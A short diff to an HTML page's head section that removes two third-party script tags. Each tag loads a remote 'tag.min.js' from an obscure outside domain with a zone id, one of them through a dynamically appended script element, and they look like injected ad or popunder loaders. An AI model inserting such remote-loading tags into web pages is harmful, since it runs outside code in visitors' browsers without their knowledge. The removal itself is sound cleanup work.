@@ -138,9 +138,6 @@
             ]
         }
     </script>
-    
-    <script src="https://3nbf4.com/act/files/tag.min.js?z=10577197" data-cfasync="false" async></script>
-    <script>(function(s){s.dataset.zone='10577186',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
     <div id="organization" hidden></div>
